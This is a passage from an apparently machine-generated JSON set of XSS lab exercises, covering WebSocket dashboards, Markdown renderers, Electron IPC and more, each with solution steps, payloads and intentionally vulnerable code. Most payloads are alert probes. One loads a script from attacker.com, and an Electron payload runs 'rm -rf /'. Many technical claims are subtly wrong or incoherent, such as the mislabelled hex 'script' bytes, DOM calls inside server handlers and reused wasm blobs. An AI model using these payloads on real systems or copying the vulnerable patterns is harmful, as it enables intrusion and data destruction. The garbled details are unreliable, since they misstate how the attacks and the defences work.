    "Lab scenario": "DOM XSS in IoT Dashboard WebSocket Analytics",
    "Lab Description": "Smart factory dashboard visualizes sensor data via WebSocket messages with unsafe SVG rendering. The application uses unencoded device IDs in dynamically created SVG elements. To solve: Inject JavaScript through malicious sensor metadata.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket handshake using OWASP ZAP",
      "Craft payload: {\"sensor\":\"<svg onload=alert(1)>\"}",
      "Bypass message validation using chunked transfer encoding",
      "Chain with WebSocket reconnection mechanisms",
      "Verify through real-time gauge visualization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "ws://[target]/push?sensorId=1<svg/onload=alert(document.domain)>",
      "{\"type\":\"telemetry\",\"data\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}"
    ],
    "srcCode": "const ws = new WebSocket(URL);\nws.onmessage = (e) => {\n  document.getElementById('viz').innerHTML += \n    JSON.parse(e.data).sensorTag; // Vulnerable\n};"
  },
  {
    "Lab scenario": "Stored XSS in CMS Markdown Renderer via SVG Filter Bypass",
    "Lab Description": "Blog platform allows Markdown posts containing SVGs that are processed by a vulnerable DOMPurify configuration. The application whitelists 'filter' CSS property in SVG styles. To solve: Achieve persistent XSS through CSS animation payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create post with payload: ![x](x.svg)",
      "Craft SVG: <svg><style>@keyframes x{from{filter:url(\"javascript:alert(1)\")}}</style>",
      "Bypass CSP using hosted SVG with same-origin policy",
      "Automate with Python Requests library",
      "Verify through scheduled post publication"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<svg><style>a{filter:url('data:,alert(1)')}</style></svg>",
      "<svg><foreignObject><div style='filter:url(\"javascript:eval(atob('YWxlcnQoMSk='))\")>X</div></foreignObject></svg>"
    ],
    "srcCode": "app.post('/articles', (req, res) => {\n  const sanitized = DOMPurify.sanitize(req.body.content, {\n    ALLOWED_ATTR: ['style'] // Dangerous config\n  });\n  db.saveArticle(sanitized);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in API Gateway Error Log Visualization",
    "Lab Description": "Cloud API gateway displays error logs using innerText with vulnerable CSS escape sequences. The application uses Chromium's textContent normalization incorrectly. To solve: Abuse CSS unicode escapes to reconstruct executable code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Trigger API errors with malformed JWT tokens",
      "Craft payload: \\FC\\48\\D3\\CD\\A1\\BC (hex-encoded <script>)",
      "Bypass textContent sanitization using CSS.escape() polyfill",
      "Chain with ::before pseudo-element injection",
      "Verify in Chrome DevTools Computed Styles"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "\\3C script\\3E alert(1)\\3C /script\\3E",
      "<\\u0053\\u0043\\u0052\\u0049\\u0050\\u0054>alert(1)</\\u0053CRIPT>"
    ],
    "srcCode": "app.use((err, req, res, next) => {\n  logger.error(err.message);\n  res.status(500).send(`<pre>${err.message}</pre>`); // Unsafe\n});"
  },
  {
    "Lab scenario": "Blind XSS in Video Conferencing Closed Captioning",
    "Lab Description": "WebRTC-based meeting platform stores subtitle transcripts in admin panel. The application uses insecure text-to-VTT conversion with null-byte handling flaws. To solve: Achieve delayed XSS through crafted subtitle metadata.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject payload in .vtt file header: WEBVTT\nX-TIMESTAMP-MAP=LOCAL:alert(1)",
      "Bypass MIME type validation using alternate encoding",
      "Automate with FFmpeg subtitle injection",
      "Monitor admin interface for payload execution",
      "Combine with CSRF to force payload download"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "WEBVTT\n\n00:00:00.000 --> 00:00:10.000\n<v <script>alert(1)</script>>",
      "X-TIMESTAMP-MAP=MPEGTS:181002,LOCAL:javascript:eval('alert(1)')"
    ],
    "srcCode": "app.post('/upload-subtitles', (req, res) => {\n  const vttContent = req.files.subs.data.toString();\n  db.saveSubtitles(vttContent.replace(/</g, '&lt;')); // Partial sanitization\n});"
  },
  {
    "Lab scenario": "Reflected XSS in Cryptocurrency Exchange QR Code Generator",
    "Lab Description": "Wallet address QR generator reflects untrusted input in SVG data URLs. The application uses unencoded user-controlled 'label' parameter in QR code metadata. To solve: Break SVG context through multiline payloads.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept QR generation request with Burp Suite",
      "Craft payload: label=</text><script>alert(1)</script>",
      "Bypass SVG XML validation using CDATA sections",
      "Automate with QR code reader validation",
      "Verify through mobile app scanning"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<image xlink:href=\"javascript:alert(1)\"/>",
      "<![CDATA[</text><script>alert(1)</script>]]>"
    ],
    "srcCode": "app.get('/qr', (req, res) => {\n  const svg = `<svg>...<text>${req.query.label}</text>...</svg>`;\n  res.type('image/svg+xml').send(svg); // No encoding\n});"
  },
  {
    "Lab scenario": "DOM-based XSS in Fitness Tracker URL Parameter Processing",
    "Lab Description": "Workout analytics dashboard dynamically loads user stats from URL parameters using vulnerable document.write(). The application parses heart rate zones without output encoding. To solve: Execute alert(document.cookie) through malformed query string payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept analytics request using Burp Suite param miner",
      "Validate with payload: ?zone=<svg/onload=confirm(1)>",
      "Bypass URL encoding using backticks and template literals",
      "Chain with window.name propagation",
      "Verify through mobile app WebView"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
      "<img src='x' onerror=`alert(${document.cookie})`>"
    ],
    "srcCode": "app.get('/stats', (req, res) => {\n  res.send(`<script>document.write('${req.query.zone}')</script>`);\n});"
  },
  {
    "Lab scenario": "Stored XSS in Project Management Tool Clipboard Events",
    "Lab Description": "Task collaboration platform insecurely handles paste events in rich text editor. The application uses execCommand() with dangerous 'insertHTML' operations. To solve: Achieve persistent XSS through crafted spreadsheet cell paste operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Prepare malicious CSV: =HYPERLINK(\"javascript:alert(1)\",\"Click\")",
      "Paste into task description using LibreOffice Calc",
      "Bypass sanitization using white-space obfuscation",
      "Automate with Puppeteer clipboard API",
      "Verify through collaborative editing sessions"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "=IMAGE(\"javascript:alert(1)\", 1)",
      "=WEBSERVICE(\"data:text/html,<script>alert(1)</script>\")"
    ],
    "srcCode": "document.addEventListener('paste', (e) => {\n  const html = e.clipboardData.getData('text/html');\n  document.getElementById('editor').innerHTML = html; // Unsafe\n});"
  },
  {
    "Lab scenario": "Mutation XSS in Social Media Image Metadata Processing",
    "Lab Description": "Photo sharing platform parses EXIF data from user uploads using vulnerable exifr library. The application renders GPS coordinates in unescaped popup tooltips. To solve: Inject JavaScript through crafted longitude values in JPEG headers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Modify EXIF data using exiftool: -GPSLongitude=\"<svg/onload=alert(1)>\"",
      "Bypass MIME type validation using progressive JPEGs",
      "Chain with EXIF orientation tag manipulation",
      "Automate with Python Pillow library",
      "Verify through mobile app location previews"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "-GPSLongitudeRef=\"</title><script>alert(1)</script>\"",
      "-UserComment=\"javascript/* */:alert(1)\""
    ],
    "srcCode": "app.post('/upload', (req, res) => {\n  const metadata = exifr.parse(req.files.image.data);\n  res.render('preview', { coords: metadata.GPS }); // Unsafe\n});"
  },
  {
    "Lab scenario": "Blind XSS in E-Learning Platform LTI Integration",
    "Lab Description": "Course management system processes Learning Tools Interoperability (LTI) launches without validating custom parameters. The application logs launch data in admin interface with 24h delay. To solve: Achieve delayed XSS through crafted lis_result_sourcedid parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept LTI launch using OAuth 1.0 signing tools",
      "Craft payload: lis_result_sourcedid=<img src=x onerror=alert(1)>",
      "Bypass signature validation using parameter substitution",
      "Automate with Python requests_oauthlib",
      "Monitor admin gradebook interface"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "custom_param=%3Cscript%20src%3D%22https%3A%2F%2Fattacker.com%2Fxss.js%22%3E%3C%2Fscript%3E",
      "ext_submit=\"javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))\""
    ],
    "srcCode": "app.post('/lti', (req, res) => {\n  db.logLaunch(req.body); // Raw storage\n  res.redirect('/launch-success');\n});"
  },
  {
    "Lab scenario": "Reflected XSS in Retail Analytics CSV Injection",
    "Lab Description": "Sales dashboard exports filtered results as CSV files with vulnerable Excel-style formula handling. The application reflects search terms in sheet names without encoding. To solve: Achieve XSS through crafted sheet title payloads.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept export request using Burp Suite",
      "Craft payload: ?search=']!A1<iframe/onload=alert(1)>",
      "Bypass CSV quoting using tab characters",
      "Automate with headless Chrome downloads",
      "Verify through LibreOffice Calc rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "=HYPERLINK(\"javascript:alert(1)\", \"Malicious Link\")",
      "@@=1-1=alert(document.domain)-1"
    ],
    "srcCode": "app.get('/export', (req, res) => {\n  const sheetName = req.query.search || 'Results';\n  res.attachment(`${sheetName}.csv`);\n  res.send(`Sheet: ${sheetName}\\n${csvData}`); // Unsafe\n});"
  },
  {
    "Lab scenario": "DOM XSS via WebAssembly Memory Corruption in Cryptocurrency Wallet",
    "Lab Description": "Blockchain wallet uses WebAssembly for transaction signing with unsafe memory buffer sharing between JS/WASM. The application implements direct memory access via ArrayBuffer without validation. To solve: Achieve arbitrary JS execution through crafted memory pointer manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze WASM module using WasmFiddle debugger",
      "Craft payload: (export \"memory\" (memory $hack 1 256))",
      "Bypass CSP using wasm-unsafe-eval directive",
      "Chain with SharedArrayBuffer timing attacks",
      "Verify via Chrome DevTools Memory Inspector"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "wasmCompile(`(module (memory (export \"memory\") 1 256)`)",
      "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
    ],
    "srcCode": "const wasmBuffer = new Uint8Array(userUploadedData);\nconst memory = new WebAssembly.Memory({ initial: 1 });\nWebAssembly.instantiate(wasmBuffer, { env: { memory } }); // Unsafe"
  },
  {
    "Lab scenario": "Stored XSS in API Gateway JWT Debug Header Processing",
    "Lab Description": "Microservices API gateway implements verbose error logging with JWT header reflection. The application stores malformed JWTs in admin Kibana dashboard without sanitization. To solve: Achieve persistent XSS through crafted JWT header injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept API request with invalid JWT using Burp Suite",
      "Craft payload: {\"alg\":\"<svg/onload=alert(1)>\"}",
      "Bypass base64url encoding using non-UTF8 byte sequences",
      "Automate with Python PyJWT library",
      "Monitor ELK stack dashboard for payload execution"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "eyJhbGciOiI8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+In0.X",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJcdTAwM2NcdTAwM2UifQ=="
    ],
    "srcCode": "app.use((err, req, res, next) => {\n  logger.error(`JWT Header: ${req.headers.authorization}`); // Unsafe log\n  next(err);\n});"
  },
  {
    "Lab scenario": "Stored XSS in Social Media Post Markdown Anchor Validation",
    "Lab Description": "Platform allows custom anchor tags in Markdown posts with vulnerable href sanitization. The application uses regex bypassable through URL-encoded newline characters. To solve: Achieve persistent XSS via javascript: protocol in disguised URLs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create post with payload: [XSS](javascript:%0aalert(1))",
      "Bypass sanitizer using tab-separated URL encoding",
      "Chain with CSP nonce reuse attack",
      "Automate with headless browser posting bot",
      "Verify through mobile app WebView rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "[Click](javascript:alert(document.domain))",
      "[Legit](j%0a%0d%09avascript:prompt(1))"
    ],
    "srcCode": "function sanitizeLink(href) {\n  return href.replace(/^javascript:/i, ''); // Incomplete\n}"
  },
  {
    "Lab scenario": "Mutation XSS in Web Bundle Document Viewer via Content-Type Confusion",
    "Lab Description": "Document collaboration tool parses .wbn bundles with improper MIME type validation. The application treats text/markdown resources as text/html when previewing. To solve: Achieve XSS through crafted resource type mismatches.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create malicious bundle using wbn CLI tool",
      "Inject payload: ---\nContent-Type: text/html\n\n<script>alert(1)</script>",
      "Bypass integrity checks via length extension attacks",
      "Automate with Web Bundle Node.js API",
      "Verify in Chrome's Isolated Web Apps"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "sha256-/3yc...=: <html><body onload=alert(1)></body></html>",
      "application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    "srcCode": "app.post('/upload', (req, res) => {\n  const bundle = parseWebBundle(req.body);\n  if(bundle.signatureValid) {\n    res.render('preview', { content: bundle.resources[0].data }); // Unsafe\n});"
  },
  {
    "Lab scenario": "DOM XSS via Trusted Types Bypass in iframe Policy Inheritance",
    "Lab Description": "CMS implements Trusted Types but allows policy inheritance in sandboxed iframes. The application uses document.write() with lax default policies. To solve: Escape iframe sandbox through prototype pollution of trustedTypes.defaultPolicy.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify iframe with policy using TT Auditor extension",
      "Craft payload: <iframe srcdoc=\"<script>alert(1)</script>\">",
      "Bypass CSP using policy.createHTML() callback override",
      "Chain with DOM clobbering of trustedTypes.emptyHTML",
      "Verify in Chromium-based browsers"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "trustedTypes.createPolicy('default', {createHTML: s => s});",
      "<iframe src=\"javascript:trustedTypes.emptyHTML\"></iframe>"
    ],
    "srcCode": "app.get('/embed', (req, res) => {\n  res.send(`<iframe srcdoc='${req.query.content}'></iframe>`);\n  console.warn('Embed content:', req.query.content); // Debug log\n});"
  },
  {
    "Lab scenario": "WebTransport Session Hijacking in Telehealth Platform",
    "Lab Description": "Real-time patient monitoring uses WebTransport for biometric streaming with insecure session handling. The application reflects session IDs in error messages without encoding. To solve: Achieve XSS through bidirectional stream poisoning with malformed datagrams.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture session initialization using Chrome's net-export",
      "Craft payload: new TextEncoder().encode('</script><svg onload=alert(1)>')",
      "Bypass CORS using WebTransport subresource requests",
      "Automate with Node.js webtransport library",
      "Verify through real-time EKG visualization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "webtransport://[target]/sessionId=<script>alert(1)</script>",
      "data:application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    "srcCode": "const transport = new WebTransport(url);\ntransport.datagrams.writable.getWriter().write(\n  new TextEncoder().encode(userInput) // Unsafe\n);"
  },
  {
    "Lab scenario": "Import Maps Injection in Stock Trading Dashboard",
    "Lab Description": "Financial dashboard dynamically loads modules using user-controlled import maps. The application constructs JSON without proper escaping. To solve: Hijack module resolution to load malicious ESM from attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept import map request via Burp Suite",
      "Inject payload: {\"imports\":{\"react\":\"data:text/javascript,alert(1)\"}}",
      "Bypass SRI using import assertions",
      "Automate with Playwright module interception",
      "Verify through trading chart visualization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<script type=\"importmap\">{\"imports\":{\"lodash\":\"javascript:alert(1)\"}}</script>",
      "import('data:text/javascript,alert(document.domain)');"
    ],
    "srcCode": "app.get('/config', (req, res) => {\n  res.json({ imports: JSON.parse(req.query.modules) });\n});"
  },
  {
    "Lab scenario": "WebGL Shader XSS in 3D Design Tool",
    "Lab Description": "CAD software processes vertex shaders from untrusted sources with debug logging. The application converts GLSL errors to HTML without sanitization. To solve: Inject JavaScript through crafted preprocessor directives.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Trigger shader compilation errors with malformed directives",
      "Craft payload: #error </style><script>alert(1)</script>",
      "Bypass error formatting using GLSL line continuations",
      "Chain with ANGLE_instanced_arrays extension",
      "Verify through Chrome WebGL Inspector"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "#pragma optimize(off)\n#error <img/src=x onerror=alert(1)>",
      "#line 1 \"</canvas><svg/onload=alert(1)>\""
    ],
    "srcCode": "try {\n  gl.compileShader(shader);\n} catch (e) {\n  showError(`GLSL Error: ${e.message}`); // Unsafe\n}"
  },
  {
    "Lab scenario": "Service Worker Cache Poisoning XSS in PWA News Reader",
    "Lab Description": "Progressive Web App caches API responses with stale-while-revalidate strategy. The application uses Cache API without request validation. To solve: Poison cache to serve malicious JavaScript from /api/feed endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify cacheable routes via Lighthouse audits",
      "Craft response: HTTP/1.1 200 OK\nContent-Type: text/javascript\n\nalert(1)",
      "Bypass CORS using no-cors fetch mode",
      "Automate with Postman Interceptor",
      "Verify through offline mode exploitation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "self.addEventListener('fetch', e => e.respondWith(\n  new Response('<script>alert(1)</script>')\n));",
      "for(;;);{\"payload\":\"</script><svg onload=alert(1)>\"}"
    ],
    "srcCode": "self.addEventListener('fetch', (e) => {\n  e.respondWith(caches.match(e.request)); // No validation\n});"
  },
  {
    "Lab scenario": "CSSOM Mutation XSS in Analytics Dashboard",
    "Lab Description": "Business intelligence tool processes CSS variables from URL parameters with vulnerable CSS.supports() check. The application uses innerHTML with style tag reflection. To Solve: Achieve XSS through CSS @import rule parser differentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CSS injection point using :target pseudo-class",
      "Craft payload: --var: </style><script>alert(1)</script>",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with adoptedStyleSheets API",
      "Verify through Safari's CSS parser"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "@import 'javascript:alert(1)';",
      "<style>a{content: \"\\3C script\\3E alert(1) \\3C /script\\3E\"}</style>"
    ],
    "srcCode": "document.getElementById('theme').innerHTML = \n  `:root { ${req.query.vars} }`; // Vulnerable"
  },
  {
    "Lab scenario": "DOM-based XSS in AI Chatbot WebSocket Stream Processing",
    "Lab Description": "LLM-powered chatbot reflects user input in streaming WebSocket responses without output encoding. The application uses innerHTML to append messages to a vulnerable chat container. To solve: Inject SVG payload that triggers alert() when response streams.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket handshake with Burp Suite",
      "Craft payload: {\"message\":\"<svg/onload=alert(document.domain)>\"}",
      "Bypass chunked encoding validation using HTTP/2 multiplexing",
      "Chain with CSRF to hijack chat sessions",
      "Verify via Chrome's WebSocket Stream Viewer"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<img src=x: onerror=alert(1)>",
      "{\"query\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}"
    ],
    "srcCode": "const ws = new WebSocket(URL);\nws.onmessage = (e) => {\n  document.getElementById('chat').innerHTML += \n    JSON.parse(e.data).content; // Vulnerable\n};"
  },
  {
    "Lab scenario": "Stored XSS in GraphQL API Batch Operation Endpoint",
    "Lab Description": "Social media platform processes batch mutations through vulnerable GraphQL introspection. The application stores user bios with unsafe JSON.stringify() sanitization. To solve: Achieve persistent XSS via Unicode escape sequences in bio field.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft batch query using Postman GraphQL client",
      "Inject payload: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
      "Bypass depth limiting using fragment spreading",
      "Automate with Python gql library",
      "Verify through profile rendering in mobile app"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"bio\":\"\\u003Cimg/src=x onerror=alert(1)\\u003E\"}",
      "\\\\u0073\\\\u0063\\\\u0072\\\\u0069\\\\u0070\\\\u0074\\\\u003Ealert(1)"
    ],
    "srcCode": "app.post('/graphql', (req, res) => {\n  const bio = JSON.stringify(req.body.variables.bio);\n  db.updateUser({ bio }); // Insecure\n});"
  },
  {
    "Lab scenario": "Mutation XSS in Server-Sent Events (SSE) Dashboard",
    "Lab Description": "Real-time monitoring tool displays SSE messages using textContent with vulnerable CSS unescape patterns. The application implements broken HTML entity encoding for status updates. To solve: Achieve XSS through CSS variable injection in streaming data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept SSE stream with OWASP ZAP",
      "Craft payload: data: {\"status\":\"--var: </style><script>alert(1)</script>\"}\n\n",
      "Bypass textContent sanitization using CSS.supports() polyfill",
      "Chain with adoptedStyleSheets API",
      "Verify in Firefox's SSE implementation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<\\u0053\\u0043\\u0052\\u0049\\u0050\\u0054>alert(1)</\\u0053CRIPT>",
      "@import 'javascript:alert(1)'"
    ],
    "srcCode": "const es = new EventSource('/updates');\nes.onmessage = (e) => {\n  document.getElementById('status').textContent = \n    JSON.parse(e.data).status; // Vulnerable\n};"
  },
  {
    "Lab scenario": "Blind XSS in JWT Refresh Token Storage",
    "Lab Description": "Authentication service stores refresh tokens in admin Redis console with vulnerable HTML rendering. The application logs raw token metadata in Laravel Telescope. To solve: Achieve delayed XSS through crafted JWT header injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Forge JWT with header: {\"alg\":\"<svg/onload=alert(1)>\"}",
      "Bypass base64url validation using non-UTF8 bytes",
      "Automate token rotation with Python requests",
      "Monitor admin audit logs for payload execution",
      "Combine with CSRF to force token refresh"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "eyJhbGciOiJcdTAwM2NcdTAwM2UifQ.eyJzdWIiOiIxMjM0In0",
      "{\"header\":\"<script>\\u0061lert(1)</script>\"}"
    ],
    "srcCode": "Redis.lpush('refresh_tokens', \n  JSON.stringify(req.body)); // Unsafe storage\n// Admin panel:\ndocument.write(refreshToken.header);"
  },
  {
    "Lab scenario": "Reflected XSS in WebAssembly Module Validation Errors",
    "Lab Description": "Smart contract compiler displays WASM validation errors using vulnerable console.html component. The application parses error messages with decodeURIComponent() instead of textContent. To solve: Execute alert() through malformed module exports.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Compile invalid WASM using wat2wasm",
      "Inject payload: (export \"<svg/onload=alert(1)>\" (func 0))",
      "Bypass error message truncation using long identifiers",
      "Automate with Go wasm_exec.js",
      "Verify in blockchain IDE interface"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "(module (export \"\\3C script\\3E\" (func 0)))",
      "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
    ],
    "srcCode": "try {\n  new WebAssembly.Module(buffer);\n} catch (e) {\n  showError(decodeURIComponent(e.message)); // Vulnerable\n}"
  },
  {
    "Lab scenario": "WebAuthn Authenticator Tampering in SSO Dashboard",
    "Lab Description": "Enterprise SSO system parses WebAuthn authenticatorData without proper CBOR validation. The application reflects credential IDs in admin panel via innerHTML. To solve: Inject HTML through malicious attestationObject extensions using FIDO2 emulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Forge authenticator using python-fido2 library",
      "Craft payload: {1: {2: \"<script>alert(1)</script>\"} in CBOR extensions",
      "Bypass base64url encoding using non-UTF8 byte sequences",
      "Automate registration ceremony with headless Chrome",
      "Verify in Safari WebAuthn implementation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "eyJ0eXBlIjoid2ViYXV0aG4uY3JlYXRlIiwiY2hhbGxlbmdlIjoiQUJDIiwiZGlzcGxheU5hbWUiOiI8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+In0=",
      "authData:Uint8Array.from(atob('PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+'), c=>c.charCodeAt(0))"
    ],
    "srcCode": "app.post('/webauthn/response', (req, res) => {\n  const credential = cbor.decode(req.body.response);\n  document.getElementById('credentials').innerHTML += \n    credential.id; // Vulnerable\n});"
  },
  {
    "Lab scenario": "Import Maps Injection in Micro-Frontend Asset Server",
    "Lab Description": "Cloud-native platform generates dynamic import maps from URL parameters. The application uses JSON.parse() without validation on user-controlled input. To solve: Hijack module resolution to load malicious ES modules from attacker domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept import map request via Burp Suite",
      "Inject payload: {\"imports\":{\"@core/\":\"data:text/javascript,alert(1)\"}}",
      "Bypass SRI using import assertions with { assert: { type: 'css' }}",
      "Automate with Playwright module interception",
      "Verify through shared dependency tree"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<script type=\"importmap\">{\"imports\":{\"react\":\"javascript:alert(document.domain)\"}}</script>",
      "import('data:text/javascript;base64,YWxlcnQoMSk=')"
    ],
    "srcCode": "app.get('/import-map', (req, res) => {\n  res.json(JSON.parse(req.query.config)); // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebTransport Protocol Hijacking in Real-Time Betting App",
    "Lab Description": "Sports betting platform uses WebTransport for odds streaming with unsafe datagram processing. The application reflects user IDs in error messages without encoding. To solve: Inject SVG payloads through malformed bidirectional streams.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture WebTransport session init with Chrome net-export",
      "Craft polyglot datagram: new TextEncoder().encode('</script><svg onload=alert(1)>')",
      "Bypass CORS using 103 Early Hints responses",
      "Chain with QUIC protocol version downgrade",
      "Verify through live odds ticker"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "webtransport://[target]/user=<script>alert(1)</script>",
      "data:application/octet-stream;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKT4="
    ],
    "srcCode": "const transport = new WebTransport(url);\ntransport.datagrams.writable.getWriter().write(\n  new TextEncoder().encode(userInput) // Unsafe\n);"
  },
  {
    "Lab scenario": "CSS @layer XSS in Design System Theme Editor",
    "Lab Description": "UI theme builder processes @layer rules with vulnerable CSSOM manipulation. The application uses insertRule() with raw user input. To solve: Break style context through crafted layer ordering and JS injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify CSS injection via Chrome Styles pane",
      "Craft payload: @layer x { :target { content: \"</style><script>alert(1)</script>\" } }",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with adoptedStyleSheets API",
      "Verify in Safari's CSS parser"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "@layer a { [css-var: '</style><svg/onload=alert(1)>'] { color: red; } }",
      ":root { --x: \"\\3C script\\3E alert(1) \\3C /script\\3E\"; }"
    ],
    "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(userCSS); // Vulnerable\ndocument.adoptedStyleSheets = [sheet];"
  },
  {
    "Lab scenario": "Electron IPC XSS in Desktop Analytics Dashboard",
    "Lab Description": "Cross-platform analytics app exposes IPC channels without context isolation. The application uses ipcRenderer.on() with dangerous innerHTML assignments. To solve: Achieve RCE through XSS-to-IPC bridge exploitation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify exposed IPC channels via Electron DevTools",
      "Craft payload: require('child_process').exec('calc')",
      "Bypass nodeIntegration protection using preload script hooks",
      "Chain with XSS in WebView postMessage handling",
      "Verify through Windows registry access"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<img src=x onerror=\"window.electron.ipcRenderer.send('exec','open -a Calculator')\">",
      "<script>process.mainModule.require('child_process').spawn('rm', ['-rf', '/'])</script>"
    ],
    "srcCode": "ipcMain.on('update-data', (event, html) => {\n  mainWindow.webContents.executeJavaScript(\n    `document.body.innerHTML = '${html}';` // Vulnerable\n  );\n});"
  },
  {
    "Lab scenario": "WebAssembly Memory Mirroring XSS in Financial Trading Platform",
    "Lab Description": "Stock trading interface mirrors WebAssembly memory to JavaScript ArrayBuffer without validation. The application displays trading errors using innerHTML with raw WASM memory dumps. To solve: Corrupt shared memory to inject HTML payloads into error messages.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Reverse-engineer WASM module using Wasmer debugger",
      "Craft payload: new Uint8Array(memory.buffer).set([...'<script>alert(1)</script>'])",
      "Bypass bounds checking using grow() operations",
      "Chain with SharedArrayBuffer timing side-channels",
      "Verify via trading console error display"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "wasmMemory.grow(256);\nnew TextDecoder().decode(wasmMemory.buffer)",
      "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
    ],
    "srcCode": "const memory = new WebAssembly.Memory({ initial: 1 });\nconst instance = await WebAssembly.instantiate(wasmBuffer, { env: { memory } });\ndocument.getElementById('errors').innerHTML = \n  new TextDecoder().decode(memory.buffer); // Vulnerable"
  },
  {
    "Lab scenario": "Trusted Types Bypass via COOP/COEP in Healthcare Analytics",
    "Lab Description": "Patient statistics dashboard enforces Trusted Types but uses permissive cross-origin policies. The application allows iframe embedding with relaxed COOP/COEP headers. To solve: Bypass Trusted Types through prototype pollution in cross-origin iframe communication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify iframe with document.domain relaxation",
      "Craft payload: window[trustedTypes][defaultPolicy] = { createHTML: s => s }",
      "Bypass CSP using postMessage handler override",
      "Chain with DOM clobbering of policy container",
